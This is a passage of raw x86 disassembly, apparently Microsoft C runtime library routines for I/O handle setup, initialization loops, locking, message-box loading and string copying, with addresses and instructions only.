  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
